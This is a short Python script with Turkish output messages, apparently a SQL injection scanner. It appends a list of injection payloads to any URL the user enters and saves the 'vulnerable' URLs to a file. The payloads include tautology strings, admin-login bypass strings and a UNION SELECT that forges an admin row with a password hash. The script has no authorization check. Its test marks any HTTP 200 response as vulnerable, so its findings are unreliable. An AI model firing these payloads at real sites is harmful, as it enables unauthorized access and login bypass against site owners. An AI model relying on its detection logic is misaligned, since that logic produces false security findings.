import requests
import urllib.parse
from urllib.parse import urlparse

def test_advanced_sql_injection_and_save_results(url):
    # SQL injection payloadları
    payloads = [
    '-', ' ', '&', '^', '*', 
    " or ''-", " or '' ", " or ''&", " or ''^", " or ''*", 
    "-", " ", "&", "^", "*", 
    " or \"\"-", " or \"\" ", " or \"\"&", " or \"\"^", " or \"\"*", 
    "or true--", "\" or true--", "' or true--", "\") or true--", "') or true--", 
    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x", "\" or \"x\"=\"x", 
    "\") or (\"x\")=(\"x", "\")) or ((\"x\"))=((\"x", "or 1=1", "or 1=1--", 
    "or 1=1#", "or 1=1/*", "admin' --", "admin' #", "admin'/*", 
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", 
    "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1", 
    "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", 
    "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", 
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", 
    "admin') or '1'='1'#", "admin') or '1'='1'/*", 
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", 
]

    vulnerable_urls = []

    for payload in payloads:
        encoded_payload = urllib.parse.quote_plus(payload)

        test_url = f"{url}{encoded_payload}"
        print(f"Test ediliyor: {test_url}")

        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"\033[91mPotansiyel SQL Injection açığı bulundu: {test_url}\033[0m")
                vulnerable_urls.append(test_url)
            else:
                print(f"Güvenli: {test_url} (Status Code: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"İstek sırasında hata oluştu: {e}")

    parsed_url = urlparse(url)
    file_name = f"{parsed_url.netloc}_vulnerabilities.txt"
    
    with open(file_name, 'w') as file:
        for vuln_url in vulnerable_urls:
            file.write(f"{vuln_url}\n")

    print(f"Açıklı URL'ler {file_name} dosyasına kaydedildi.")

url = input("Test etmek istediğiniz URL'yi girin: ")
test_advanced_sql_injection_and_save_results(url)
